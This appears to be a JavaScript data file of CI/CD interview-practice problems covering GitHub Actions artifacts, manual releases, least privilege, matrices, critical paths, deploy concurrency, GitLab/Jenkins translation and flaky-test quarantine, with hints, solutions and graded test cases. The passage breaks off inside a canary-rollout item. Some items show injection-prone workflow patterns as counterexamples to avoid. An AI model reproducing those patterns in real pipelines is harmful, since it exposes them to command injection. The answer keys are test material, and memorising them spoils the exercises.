      a: `<p>Two bugs: user text pasted into a script (injection) and a token with every permission. Pass the title and number through environment variables, set top-level <code>permissions: {}</code>, and grant <code>issues: write</code> on the job. The shell now treats the title as data.</p>`,
      code: Y(R`name: label-crash-issues
on:
  issues:
    types: [opened, edited]
permissions: {}                               # nothing by default
jobs:
  label:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    permissions:
      issues: write                           # exactly what "gh issue edit" needs
    steps:
      - name: Label crash reports
        env:
          TITLE: @{{ github.event.issue.title }}
          NUMBER: @{{ github.event.issue.number }}
          GH_TOKEN: @{{ github.token }}
          REPO: @{{ github.repository }}
        run: |
          if printf '%s' "$TITLE" | grep -qi -- 'crash'; then
            gh issue edit "$NUMBER" --repo "$REPO" --add-label bug
          fi`, 'label-crash-issues.yml'),
      cx: `<p>Constant. The security win is the removal of an arbitrary-code path.</p>`,
      f: ['What other fields in the same event are attacker-controlled?', 'How would you enforce this rule across 200 repos?']
    })]
  });

  // ───────────────────────── Practice: Easy and Medium ─────────────────────────
  practice.push(P({
    t: 'Pass a build between jobs with artifacts', l: 'Easy', tags: ['artifacts', 'needs', 'github actions'], co: ['Accenture', 'TCS', 'Thoughtworks'],
    s: `<p>A <code>build</code> job produces <code>dist/app.tar.gz</code>. A second job <code>smoke</code> must test <b>that exact file</b> on a fresh runner. Write the workflow. Name the artifact uniquely per run, keep it 3 days, and make the upload fail if the file is missing.</p>`,
    ex: `<p>Run 1 builds and uploads <code>dist-3f9c...</code>; the smoke job downloads <code>dist-3f9c...</code> and extracts it → ${H.c('g', 'tests the same bytes that were built')}. If the build produced nothing → ${H.c('r', 'upload step fails with if-no-files-found: error')}.</p>`,
    bw: `<p>Re-running <code>make dist</code> in the smoke job. It tests a second build, which may differ (timestamps, new dependency versions), so a green result proves nothing about the first build.</p>`,
    bc: Y(R`jobs:
  smoke:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make dist && ./dist/app --version   # builds again: a different artifact`, 'naive: rebuild instead of reuse'),
    q: ['Why must <code>download-artifact</code> run in the second job at all?', ['Each job gets a fresh runner, so files from the first job do not exist there', 'Artifacts are copied automatically between jobs', 'It is only needed for self-hosted runners', 'To speed up checkout'], 0, 'Jobs are isolated machines. Anything one job produces must be uploaded as an artifact (or output) to be available to another.'],
    h: ['<p>Hint 1: <code>upload-artifact@v4</code> in <code>build</code>, <code>download-artifact@v4</code> in <code>smoke</code>.</p>', '<p>Hint 2: <code>smoke</code> needs <code>needs: build</code> or it starts in parallel.</p>', '<p>Hint 3: the name can include <code>@{{ github.sha }}</code>; set <code>retention-days: 3</code> and <code>if-no-files-found: error</code>.</p>'],
    a: `<p>Build once, upload, download, test. The <code>needs</code> relationship orders the jobs; the unique name avoids the v4 "name already exists" error on re-runs of the same commit in other workflows; retention keeps storage small.</p>`,
    code: Y(R`name: build-and-smoke
on: [push]
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: make dist
      - uses: actions/upload-artifact@v4
        with:
          name: dist-@{{ github.sha }}
          path: dist/app.tar.gz
          retention-days: 3
          if-no-files-found: error
  smoke:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: dist-@{{ github.sha }}
      - run: tar -xzf app.tar.gz && ./app --version`, 'build-and-smoke.yml'),
    cx: `<p>One build instead of two; the artifact upload adds seconds.</p>`,
    f: ['What changes if the same workflow runs twice for one commit (re-run)?', 'When would you use a cache instead of an artifact?']
  }));

  practice.push(P({
    t: 'Manual release with typed inputs and a protected environment', l: 'Easy', tags: ['workflow_dispatch', 'environments', 'inputs'], co: ['Infosys', 'Mindtree', 'ThoughtWorks'],
    s: `<p>Operations want a "Run workflow" button that deploys a chosen version to <code>staging</code> or <code>production</code>. Requirements: a dropdown for the target, a required text field for the version (a git tag), the job uses the matching environment (so production needs approval), and the inputs are not injected into the shell script text.</p>`,
    ex: `<p>Choose <code>production</code>, version <code>v1.4.2</code> → the job pauses for the production reviewers, then runs <code>./scripts/deploy.sh production v1.4.2</code>. Choosing <code>staging</code> → runs at once.</p>`,
    bw: `<p>A free-text "target" field and <code>run: ./deploy.sh @{{ inputs.target }} @{{ inputs.version }}</code>. A typo reaches production, and the inputs are pasted into the script (injection risk, even from trusted users).</p>`,
    q: ['How can one job pick the environment from an input?', ['<code>environment: @{{ inputs.target }}</code>', 'Environments cannot be dynamic', 'Using <code>runs-on</code>', 'With <code>needs</code>'], 0, 'The <code>environment</code> key accepts an expression, so the protection rules and secrets of the chosen environment apply.'],
    h: ['<p>Hint 1: <code>inputs.target</code> as <code>type: choice</code> with <code>options</code>; <code>inputs.version</code> as <code>type: string</code>, <code>required: true</code>.</p>', '<p>Hint 2: <code>environment: @{{ inputs.target }}</code> on the job.</p>', '<p>Hint 3: pass the inputs through <code>env:</code> and quote them in the script.</p>'],
    a: `<p>Typed inputs remove typos; the dynamic environment attaches the right reviewers and secrets; <code>env</code> keeps the values out of the script text. Also validate the version looks like a tag before using it.</p>`,
    code: Y(R`name: manual-release
on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Where to deploy'
        type: choice
        options: [staging, production]
        required: true
      version:
        description: 'Git tag to deploy (for example v1.4.2)'
        type: string
        required: true
permissions:
  contents: read
concurrency:
  group: release-@{{ inputs.target }}
  cancel-in-progress: false
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: @{{ inputs.target }}
    timeout-minutes: 15
    steps:
      - name: Validate the version
        env:
          VERSION: @{{ inputs.version }}
        run: |
          if ! printf '%s' "$VERSION" | grep -Eq '^v[0-9]+[.][0-9]+[.][0-9]+$'; then
            echo "version must look like v1.2.3" >&2; exit 1
          fi
      - uses: actions/checkout@v4
        with:
          ref: @{{ inputs.version }}
          persist-credentials: false
      - name: Deploy
        env:
          TARGET: @{{ inputs.target }}
          VERSION: @{{ inputs.version }}
        run: ./scripts/deploy.sh "$TARGET" "$VERSION"`, 'manual-release.yml'),
    cx: `<p>Constant. The control is the environment's reviewer list.</p>`,
    f: ['How would you restrict who can press the button?', 'How could this deploy the previously built digest instead of rebuilding from a tag?']
  }));

  practice.push(P({
    t: 'Add least privilege, a timeout and pinned actions', l: 'Easy', tags: ['permissions', 'pinning', 'dependabot', 'security'], co: ['Cisco', 'SAP', 'Capgemini'],
    s: `<p>Harden this workflow without changing what it does: <code>on: push</code>, checkout, <code>setup-node</code>, <code>npm ci</code>, <code>npm test</code>. It currently has no <code>permissions</code> block, no timeout, and uses <code>actions/checkout@main</code>. Fix those, show how a third-party action is pinned to a full SHA (use a placeholder SHA), and add the config that keeps pins fresh.</p>`,
    ex: `<p><code>actions/checkout@main</code> → ${H.c('r', 'moves on every push to that repo')}; <code>actions/checkout@v4</code> → ${H.c('y', 'moves within v4')}; <code>actions/checkout@&lt;40-hex-sha&gt; # v4.2.2</code> → ${H.c('g', 'cannot move')}.</p>`,
    bw: `<p>Leaving defaults. A compromised dependency step could use a broad token, and a hung test runs for up to 6 hours.</p>`,
    q: ['A tag like <code>@v4</code> is safer than <code>@main</code>, so why pin a SHA?', ['A tag can be re-pointed by whoever controls the action repo; a commit SHA cannot change', 'SHAs download faster', 'Tags are not allowed in private repos', 'SHAs enable caching'], 0, 'Git tags are movable labels. A full commit SHA is immutable content, so reviewed code stays reviewed.'],
    h: ['<p>Hint 1: add <code>permissions: contents: read</code> at the top and <code>timeout-minutes</code> on the job.</p>', '<p>Hint 2: <code>uses: owner/action@0123456789abcdef0123456789abcdef01234567 # v1.2.3</code> keeps a human-readable version in a comment.</p>', '<p>Hint 3: Dependabot with <code>package-ecosystem: github-actions</code> proposes SHA bumps as PRs.</p>'],
    a: `<p>Three small edits plus a bot: explicit read-only token, a timeout, versions that cannot move, and weekly update PRs so pinning does not become stale pinning.</p>`,
    code: Y(R`name: ci
on: push
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4                  # first-party; a SHA is better still
        with:
          persist-credentials: false
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
      # third-party action: pinned to a full commit SHA (placeholder), version in a comment
      - uses: example-org/lint-action@0123456789abcdef0123456789abcdef01234567 # v2.3.1
      - run: npm ci
      - run: npm test`, 'ci.yml (hardened)'),
    alt: [Y(DEPENDABOT, '.github/dependabot.yml')],
    cx: `<p>None; it is a policy change.</p>`,
    f: ['What organisation setting can enforce SHA pinning?', 'What could Dependabot not catch about a pinned action?']
  }));

  practice.push(P({
    t: 'Expand a build matrix with include and exclude', l: 'Medium', tags: ['matrix', 'python', 'github actions'], co: ['GitHub', 'Microsoft', 'JetBrains'], c: PYC,
    s: `<p>Write <code>matrix_expand(axes, include, exclude)</code> that lists the jobs GitHub creates from a matrix. <code>axes</code> is like <code>["os=ubuntu,windows", "node=18,20"]</code>. Build the product (first axis changes slowest), then drop every combination that matches an <code>exclude</code> entry (an entry matches when all its key=value pairs are equal to the combination's), then apply each <code>include</code> in order: if its axis keys match one or more existing combinations, add its other keys to all of them (later includes can overwrite earlier extras); otherwise append it as a new job. Return strings like <code>os=ubuntu,node=20,coverage=true</code> (axes first, then extras in the order added; new includes keep their own order).</p>`,
    ex: `<p>axes <code>os=ubuntu,windows</code> and <code>node=18,20</code>, exclude <code>os=windows,node=18</code>, include <code>os=ubuntu,node=20,coverage=true</code> → ${H.c('g', '["os=ubuntu,node=18", "os=ubuntu,node=20,coverage=true", "os=windows,node=20"]')}.</p>`,
    bw: `<p>Writing the combinations by hand into separate jobs. It drifts, and nobody notices that a version was dropped from one copy.</p>`,
    bc: PY(`def matrix_expand(axes, include, exclude):
    return ["os=ubuntu,node=20"]       # a hand-written list: wrong as soon as the matrix changes`, 'naive'),
    q: ['An <code>include</code> entry with <code>os: macos, node: 20</code> matches no combination. What happens?', ['A new job is added', 'It is ignored', 'The workflow fails', 'It replaces the first job'], 0, 'If an include entry cannot be merged into any existing combination without overwriting an axis value, it becomes an extra job.'],
    h: ['<p>Hint 1: build the product with a loop over axes, keeping each combination as an ordered dict.</p>', '<p>Hint 2: keys that are axis names are "original values" (never overwritten); other keys are extras.</p>', '<p>Hint 3: exclude first, then includes in the given order.</p>'],
    a: `<p>Product, filter, merge. The only subtle part is classifying each include key as an axis key (used for matching) or an extra (added to the matches). The YAML below shows the workflow the function models.</p>`,
    code: Y(R`strategy:
  fail-fast: false
  matrix:
    os: [ubuntu, windows]
    node: [18, 20]
    exclude:
      - os: windows
        node: 18
    include:
      - os: ubuntu
        node: 20
        coverage: true        # extra variable on the existing ubuntu/20 job
      - os: macos
        node: 20              # no match: becomes a fourth job`, 'matrix with include and exclude'),
    alt: [PY(R`def matrix_expand(axes, include, exclude):
    names, values = [], []
    for a in axes:
        k, v = a.split("=", 1)
        names.append(k)
        values.append(v.split(","))
    combos = [{}]                                   # product: first axis changes slowest
    for k, vs in zip(names, values):
        combos = [dict(c, **{k: x}) for c in combos for x in vs]

    def parse(entry):
        return [tuple(p.split("=", 1)) for p in entry.split(",")]

    excl = [dict(parse(e)) for e in exclude]
    combos = [c for c in combos
              if not any(all(c.get(k) == v for k, v in ex.items()) for ex in excl)]

    for inc in include:
        pairs = parse(inc)
        axis_pairs = [(k, v) for k, v in pairs if k in names]
        extra_pairs = [(k, v) for k, v in pairs if k not in names]
        matches = [c for c in combos if all(c[k] == v for k, v in axis_pairs)]
        if matches:
            for c in matches:
                for k, v in extra_pairs:
                    c[k] = v                        # extras may overwrite earlier extras
        else:
            combos.append(dict(pairs))              # nothing to merge into: a new job
    return [",".join(k + "=" + v for k, v in c.items()) for c in combos]`, 'matrix_expand (tested)')],
    cx: `<p>O(P x (E + I)) for P combinations, E excludes and I includes. GitHub caps a matrix at 256 jobs.</p>`,
    f: ['How would you also report which combinations were excluded?', 'What happens if an include entry has an axis value that never appears in the axes?'],
    tests: { sig: 'string[] string[] string[] -> string[]', fn: 'matrixExpand', cases: [
      [[['os=ubuntu,windows', 'node=18,20'], [], []], ['os=ubuntu,node=18', 'os=ubuntu,node=20', 'os=windows,node=18', 'os=windows,node=20']],
      [[['os=ubuntu,windows', 'node=18,20'], [], ['os=windows,node=18']], ['os=ubuntu,node=18', 'os=ubuntu,node=20', 'os=windows,node=20']],
      [[['os=ubuntu,windows', 'node=18,20'], [], ['os=windows']], ['os=ubuntu,node=18', 'os=ubuntu,node=20']],
      [[['os=ubuntu,windows', 'node=18,20'], ['os=ubuntu,node=20,coverage=true'], []], ['os=ubuntu,node=18', 'os=ubuntu,node=20,coverage=true', 'os=windows,node=18', 'os=windows,node=20']],
      [[['os=ubuntu,windows', 'node=18,20'], ['os=macos,node=20'], []], ['os=ubuntu,node=18', 'os=ubuntu,node=20', 'os=windows,node=18', 'os=windows,node=20', 'os=macos,node=20']],
      [[['os=ubuntu,windows', 'node=18,20'], ['experimental=true'], []], ['os=ubuntu,node=18,experimental=true', 'os=ubuntu,node=20,experimental=true', 'os=windows,node=18,experimental=true', 'os=windows,node=20,experimental=true']],
      [[['py=3.11,3.12'], ['py=3.13'], ['py=3.11']], ['py=3.12', 'py=3.13']],
      [[['os=ubuntu,windows', 'node=18,20'], ['os=ubuntu,flag=a'], []], ['os=ubuntu,node=18,flag=a', 'os=ubuntu,node=20,flag=a', 'os=windows,node=18', 'os=windows,node=20']],
      [[['os=ubuntu,windows', 'node=18,20'], ['os=ubuntu,tag=x', 'os=ubuntu,node=20,tag=y'], []], ['os=ubuntu,node=18,tag=x', 'os=ubuntu,node=20,tag=y', 'os=windows,node=18', 'os=windows,node=20']],
      [[['a=1'], ['a=2'], ['a=1']], ['a=2']],
      [[['os=u,w', 'v=1,2', 'arch=x'], [], ['os=w,v=2']], ['os=u,v=1,arch=x', 'os=u,v=2,arch=x', 'os=w,v=1,arch=x']],
      [[['a=1,2'], [], ['foo=1']], ['a=1', 'a=2']]
    ] }
  }));

  practice.push(P({
    t: 'How long will the pipeline take? Critical path from needs', l: 'Medium', tags: ['needs', 'dag', 'critical path', 'python'], co: ['Atlassian', 'Uber', 'Swiggy'], c: PYC,
    s: `<p>Write <code>critical_path(jobs)</code>. Each job is a string <code>"name|minutes|dep1,dep2"</code> (deps may be empty). Jobs with no <code>needs</code> start at minute 0; a job starts when its slowest dependency finishes. Return the minute at which the last job finishes. Return <code>-1</code> if a job needs an unknown job or the dependencies form a cycle (GitHub rejects both). An empty list takes 0 minutes.</p>`,
    ex: `<p><code>["lint|2|", "build|4|", "unit|6|build", "e2e|9|build", "package|3|unit,e2e", "deploy|2|package,lint"]</code> → ${H.c('g', '18')}: build 4, e2e done at 13, package at 16, deploy at 18. Total work is 26 minutes, but the answer is the longest chain. Lint (2) is not on the critical path.</p>`,
    bw: `<p>Adding up all the minutes (26) and concluding that the pipeline needs optimising everywhere. Speeding up lint by a minute changes nothing; shortening e2e by a minute shortens the pipeline by a minute.</p>`,
    bc: PY(`def critical_path(jobs):
    return sum(int(j.split("|")[1]) for j in jobs)     # the SUM, not the longest chain`, 'naive: sum'),
    q: ['Which change shortens the example pipeline (critical path build, e2e, package, deploy)?', ['Sharding the e2e job', 'Making lint faster', 'Removing the lint job', 'Running unit tests on a bigger machine'], 0, 'Only jobs on the critical path set the wall-clock time. Unit tests (6) finish before e2e (9) so speeding them up has no effect until e2e is shorter.'],
    h: ['<p>Hint 1: finish(job) = minutes(job) + max(finish(dep) for dep in deps), or just minutes if there are no deps.</p>', '<p>Hint 2: use memoised recursion with a "visiting" set to detect cycles.</p>', '<p>Hint 3: check unknown deps before computing; the answer is the maximum finish time.</p>'],
    a: `<p>This is the longest path in a directed acyclic graph. Memoised depth-first search computes each job's finish time once; a job seen again while still "visiting" means a cycle. In the real workflow the answer is the same graph expressed with <code>needs</code>.</p>`,
    code: Y(R`# The example graph as a workflow: lint and build start together; the rest follow needs
jobs:
  lint:    { runs-on: ubuntu-latest, steps: [{ run: ./ci/lint.sh }] }          # 2 min
  build:   { runs-on: ubuntu-latest, steps: [{ run: ./ci/build.sh }] }         # 4 min
  unit:    { needs: build, runs-on: ubuntu-latest, steps: [{ run: ./ci/unit.sh }] }     # 6 min
  e2e:     { needs: build, runs-on: ubuntu-latest, steps: [{ run: ./ci/e2e.sh }] }      # 9 min  (critical)
  package: { needs: [unit, e2e], runs-on: ubuntu-latest, steps: [{ run: ./ci/package.sh }] }  # 3 min
  deploy:  { needs: [package, lint], runs-on: ubuntu-latest, steps: [{ run: ./ci/deploy.sh }] } # 2 min
# critical path: build 4 -> e2e 9 -> package 3 -> deploy 2 = 18 minutes`, 'job graph'),
    alt: [PY(R`def critical_path(jobs):
    info = {}
    for line in jobs:
        name, minutes, deps = line.split("|")
        info[name] = (int(minutes), [d for d in deps.split(",") if d])
    for _, (_, deps) in info.items():
        for d in deps:
            if d not in info:
                return -1                          # unknown dependency
    finish, visiting = {}, set()

    def go(name):
        if name in finish:
            return finish[name]
        if name in visiting:
            raise ValueError("cycle")
        visiting.add(name)
        minutes, deps = info[name]
        start = max((go(d) for d in deps), default=0)
        visiting.discard(name)
        finish[name] = start + minutes
        return finish[name]

    try:
        return max((go(n) for n in info), default=0)
    except ValueError:
        return -1`, 'critical_path (tested)')],
    cx: `<p>O(V + E): each job and each dependency edge is visited once.</p>`,
    f: ['How would you print the critical path itself, not just its length?', 'How does a matrix change the graph?'],
    tests: { sig: 'string[] -> int', fn: 'criticalPath', cases: [
      [[['build|4|']], 4],
      [[['lint|2|', 'build|4|', 'unit|6|build', 'e2e|9|build', 'package|3|unit,e2e', 'deploy|2|package,lint']], 18],
      [[['a|3|', 'b|5|', 'c|2|']], 5],
      [[['a|1|', 'b|2|a', 'c|3|b']], 6],
      [[['a|1|', 'b|10|a', 'c|2|a', 'd|1|b,c']], 12],
      [[['a|1|b', 'b|1|a']], -1],
      [[['a|1|zzz']], -1],
      [[['a|0|', 'b|5|a']], 5],
      [[['deploy|2|test', 'test|5|build', 'build|3|']], 10],
      [[['lint|20|', 'build|4|', 'test|6|build']], 20],
      [[['a|1|a']], -1],
      [[[]], 0]
    ] }
  }));

  practice.push(P({
    t: 'Two deploys racing: make them take turns', l: 'Medium', tags: ['concurrency', 'deploy', 'race condition'], co: ['Amazon', 'Zalando', 'Cognizant'],
    s: `<p>Two PRs merge two minutes apart and both start the <code>deploy</code> job, which takes 6 minutes. The older commit's deploy finishes last, so production ends on the older code. Fix the workflow so (1) deploys to production never run at the same time, (2) a deploy that has started is never cancelled, (3) if three merges arrive quickly, only the <b>newest</b> waiting one runs after the current one finishes, and (4) CI runs on PRs are still cancelled when superseded.</p>`,
    ex: `<p>Merge A at 10:00, B at 10:02, C at 10:03. A is running; B is waiting; C arrives → B is cancelled (replaced), C waits. A finishes at 10:06, C runs. Result: ${H.c('g', 'production ends on C, the newest commit')}.</p>`,
    bw: `<p>Setting <code>cancel-in-progress: true</code> on the deploy. A half-applied deploy (migration done, code not switched) is the worst state you can leave production in.</p>`,
    q: ['With <code>cancel-in-progress: false</code>, what happens to a third run arriving while one is running and one is pending?', ['The older pending run is cancelled and replaced by the newest', 'All three run in order', 'The running one is cancelled', 'The third run is rejected with an error'], 0, 'A concurrency group holds at most one running and one pending run. A new arrival replaces the pending one. That is exactly what you want for deploys: only the newest matters.'],
    h: ['<p>Hint 1: a <code>concurrency</code> block with a fixed group name on the deploy job (not on the workflow if CI shares the file).</p>', '<p>Hint 2: <code>cancel-in-progress: false</code> for deploy, an expression or <code>true</code> for CI.</p>', '<p>Hint 3: because older pending deploys can be replaced, also make the deploy refuse to go backwards (compare commit order).</p>'],
    a: `<p>Put the deploy in a separate job with its own group so only deploys queue, while test jobs keep their per-ref cancellation. The group name is constant, so every branch shares one lane. Add a safety check that the commit being deployed is not older than the one already live.</p>`,
    code: Y(R`name: pipeline
on:
  pull_request:
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    concurrency:                                   # CI: newest push wins
      group: ci-@{{ github.ref }}
      cancel-in-progress: true
    steps:
      - uses: actions/checkout@v4
      - run: ./ci/test.sh
  deploy:
    if: github.ref == 'refs/heads/main'
    needs: test
    runs-on: ubuntu-latest
    environment: production
    concurrency:                                   # CD: one lane, never cancel a running deploy
      group: deploy-production
      cancel-in-progress: false
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Refuse to deploy an older commit than production
        env:
          NEW_SHA: @{{ github.sha }}
        run: |
          LIVE_SHA="$(curl -fsS https://app.example.com/version || true)"
          if [ -n "$LIVE_SHA" ] && git merge-base --is-ancestor "$NEW_SHA" "$LIVE_SHA" && [ "$NEW_SHA" != "$LIVE_SHA" ]; then
            echo "live $LIVE_SHA is newer than $NEW_SHA: skipping" >&2
            exit 0
          fi
          ./scripts/deploy.sh production "$NEW_SHA"`, 'pipeline.yml'),
    cx: `<p>No compute cost; the benefit is correctness: production always ends on the newest commit.</p>`,
    f: ['Why not put the concurrency block at workflow level?', 'How would you serialise deploys across two different workflows?']
  }));

  practice.push(P({
    t: 'The same pipeline in GitLab CI and Jenkins', l: 'Medium', tags: ['gitlab ci', 'jenkins', 'migration'], co: ['Wipro', 'IBM', 'Accenture'],
    s: `<p>Translate this GitHub Actions job to <b>both</b> GitLab CI and a declarative Jenkinsfile: run <code>npm ci</code> and <code>npm test</code> on Node 22 with the npm cache; on <code>main</code> only, wait for a manual approval and then run <code>./scripts/deploy.sh</code>; only one deploy at a time; production credentials come from the platform's secret store as <code>DEPLOY_TOKEN</code> (placeholder). Say which GitHub feature each piece corresponds to.</p>`,
    ex: `<p>GitHub <code>environment: production</code> with reviewers ↔ GitLab <code>environment</code> + <code>when: manual</code> ↔ Jenkins <code>input</code> step. GitHub <code>concurrency</code> ↔ GitLab <code>resource_group</code> ↔ Jenkins <code>lock</code>.</p>`,
    bw: `<p>Translating line by line and missing the approval and the lock, because those are different concepts in each tool. The result deploys on every merge, two at a time.</p>`,
    q: ['Which GitLab keyword gives "one deploy at a time"?', ['<code>resource_group</code>', '<code>stages</code>', '<code>extends</code>', '<code>artifacts</code>'], 0, 'resource_group makes jobs in the same group run one after another, like a GitHub concurrency group with cancel-in-progress false.'],
    h: ['<p>Hint 1: GitLab: <code>cache: key: files: [package-lock.json]</code>, <code>rules</code> with <code>when: manual</code>, <code>resource_group</code>.</p>', '<p>Hint 2: Jenkins: <code>input</code> for approval, <code>options { disableConcurrentBuilds() }</code> or <code>lock</code>.</p>', '<p>Hint 3: secrets are masked CI/CD variables (GitLab) and <code>withCredentials</code> (Jenkins); never write the value.</p>'],
    a: `<p>Map concept by concept: runner/image, cache, test, gated deploy, serialisation, secrets. The GitLab file below uses a protected manual job and a resource group; the Jenkinsfile uses <code>input</code>, a lock and bound credentials.</p>`,
    code: Y(R`# .gitlab-ci.yml
stages: [test, deploy]

default:
  image: node:22
  cache:
    key:
      files: [package-lock.json]
    paths: [.npm/]

variables:
  npm_config_cache: "$CI_PROJECT_DIR/.npm"

test:
  stage: test
  script:
    - npm ci
    - npm test

deploy_production:
  stage: deploy
  needs: [test]
  environment:
    name: production
  resource_group: production                  # one deploy at a time
  rules:
    - if: $CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH
      when: manual                            # a person must press play
  script:
    - ./scripts/deploy.sh                     # DEPLOY_TOKEN is a masked, protected CI/CD variable set in the UI`, '.gitlab-ci.yml'),
    alt: [JF(R`// Jenkinsfile
pipeline {
  agent { docker { image 'node:22' } }
  options { timeout(time: 20, unit: 'MINUTES') }
  stages {
    stage('Test') {
      steps {
        sh 'npm ci'
        sh 'npm test'
      }
    }
    stage('Deploy') {
      when { branch 'main' }
      options { lock('production') }                             // one deploy at a time
      steps {
        input message: 'Deploy to production?', ok: 'Deploy'     // manual approval
        withCredentials([string(credentialsId: 'deploy-token', variable: 'DEPLOY_TOKEN')]) {
          sh './scripts/deploy.sh'                               // token is masked in the log
        }
      }
    }
  }
}`)],
    cx: `<p>No runtime complexity; the effort is in mapping approvals, locks and secrets correctly.</p>`,
    f: ['What would you lose by moving this to Jenkins (hint: plugins, upgrades)?', 'How would the GitLab file get OIDC credentials for a cloud provider?']
  }));

  practice.push(P({
    t: 'Quarantine flaky tests without blocking merges', l: 'Medium', tags: ['flaky tests', 'required checks', 'ci-ok', 'reliability'], co: ['Google', 'Shopify', 'Freshworks'],
    s: `<p>Two end-to-end tests fail about one run in eight for reasons unrelated to the change, and developers keep clicking re-run. Design the workflow change: the stable unit tests stay required; the e2e suite is split into <code>stable</code> (required) and <code>quarantine</code> (tests tagged <code>@flaky</code>) which still runs and reports but does not block; the required check is a single always-running aggregate job so renaming jobs does not break branch protection; failed quarantined runs upload their report. Say what else the team must do so quarantine is not a graveyard.</p>`,
    ex: `<p>A PR where a quarantined test fails → ${H.c('g', 'checks green, merge allowed')}, the report artifact is attached and the failure is counted. A PR where a stable test fails → ${H.c('r', 'ci-ok fails, merge blocked')}.</p>`,
    bw: `<p><code>continue-on-error: true</code> on the whole e2e job, or auto-retrying everything three times. Real failures are hidden and nobody measures how flaky the suite is.</p>`,
    q: ['Why require an aggregate <code>ci-ok</code> job instead of each test job by name?', ['Job names change with matrices and path filters; one stable name keeps branch protection correct', 'It is faster', 'GitHub forbids requiring more than one check', 'Aggregates skip tests'], 0, 'Branch protection matches names. A final job that depends on all others (with if: always()) gives one name that is always reported.'],
    h: ['<p>Hint 1: run the suite twice with test tags: one job with <code>--grep-invert @flaky</code>, one with <code>--grep @flaky</code>.</p>', '<p>Hint 2: the quarantine job is not in the <code>needs</code> of <code>ci-ok</code>, or is checked softly.</p>', '<p>Hint 3: <code>ci-ok</code> uses <code>if: always()</code> and fails when any needed result is not <code>success</code>.</p>'],
    a: `<p>Separate the signal you trust from the signal you are still fixing. The quarantine job still runs on every PR, so you keep data, but only the stable job gates merges. The aggregate gives branch protection a single stable name. The social part matters: every quarantined test gets an owner and a deadline, and the count is tracked so quarantine shrinks.</p>`,
    code: Y(R`name: ci
on:
  pull_request:
  merge_group:                                     # a merge queue runs the same checks
permissions:
  contents: read
jobs:
  e2e-stable:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: npx playwright test --grep-invert @flaky

  e2e-quarantine:                                  # runs, reports, never blocks
    runs-on: ubuntu-latest
    timeout-minutes: 15
    continue-on-error: true                        # allowed ONLY here, on the known-flaky job
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: npm }
      - run: npm ci
      - run: npx playwright test --grep @flaky --retries=2 --reporter=html
      - if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: quarantine-report-@{{ github.run_id }}
          path: playwright-report/
          retention-days: 7

  ci-ok:                                           # the only required status check
    if: always()
    needs: [e2e-stable]
    runs-on: ubuntu-latest
    steps:
      - name: Fail if the stable suite did not succeed
        env:
          RESULT: @{{ needs.e2e-stable.result }}
        run: |
          echo "e2e-stable: $RESULT"
          [ "$RESULT" = "success" ]`, 'ci.yml with quarantine'),
    cx: `<p>One extra parallel job. The cost is attention: a weekly review of the quarantine list.</p>`,
    f: ['What metric would you graph to decide whether quarantine is working?', 'When is auto-retry acceptable and when is it harmful?']
  }));

  // ───────────────────────── Practice: Hard ─────────────────────────
  practice.push(P({
    t: 'Canary rollout: decide to continue, promote or roll back', l: 'Hard', tags: ['canary', 'rollback', 'slo', 'python', 'bash'], co: ['Netflix', 'Google', 'Atlassian'], c: PYC,
    s: `<p>A canary goes through traffic steps 5%, 25%, 50%, 100%. After each step you measure errors per 10,000 requests for the canary and for the baseline (old version). The canary is healthy at a step if its errors are at most <code>max(2 x baseline, baseline + slack)</code>. Write <code>canary_decision(canary, baseline, slack)</code> where both lists hold the measurements for the steps completed so far (equal length, up to 4). Return <code>"rollback@W"</code> for the <b>first</b> unhealthy step at weight W, <code>"promote"</code> if all four steps are healthy, otherwise <code>"continue@W"</code> with the next weight to try. Then write the bash loop the pipeline would run, which sets weights, waits, measures and rolls back by itself.</p>`,
    ex: `<p>canary <code>[3, 5, 9, 12]</code>, baseline <code>[2, 2, 3, 4]</code>, slack 5: allowances are 7, 7, 8, 9 → step 3 (50%) has 9 &gt; 8 → ${H.c('r', '"rollback@50"')}. canary <code>[3]</code>, baseline <code>[2]</code> → ${H.c('g', '"continue@25"')}. canary <code>[]</code> → ${H.c('y', '"continue@5"')}.</p>`,
    bw: `<p>A fixed threshold ("error rate &lt; 1%") for every step. When the whole platform has a bad minute, the baseline errors rise too and the canary is blamed (or a real regression hides under a loose limit). Comparing against the baseline measured at the same time removes the shared noise.</p>`,
    bc: PY(`def canary_decision(canary, baseline, slack):
    return "promote" if all(c < 100 for c in canary) else "rollback"    # fixed threshold, no steps, no baseline`, 'naive'),
    q: ['Why compare the canary with the live baseline rather than with last week\'s average?', ['Both see the same traffic and the same platform conditions at the same time', 'Last week\'s data is not stored', 'It is cheaper to compute', 'The baseline is always zero'], 0, 'A same-time baseline controls for noise such as a slow dependency or a traffic spike that affects both versions equally.'],
    h: ['<p>Hint 1: keep a constant list of weights <code>[5, 25, 50, 100]</code>; step i uses <code>weights[i]</code>.</p>', '<p>Hint 2: allowed = <code>max(2*b, b + slack)</code>; unhealthy if <code>c &gt; allowed</code> (equal is healthy).</p>', '<p>Hint 3: return at the first unhealthy step; after the loop, 4 healthy steps means promote, fewer means continue at <code>weights[len]</code>.</p>'],
    a: `<p>The function is the policy: a threshold relative to the baseline with a floor so tiny baselines do not make the rule hypersensitive. The bash loop turns it into automation: for each weight, shift traffic, wait for the bake window, measure both versions, and either move on or send traffic back to 0% and fail the job.</p>`,
    code: SH(R`#!/usr/bin/env bash
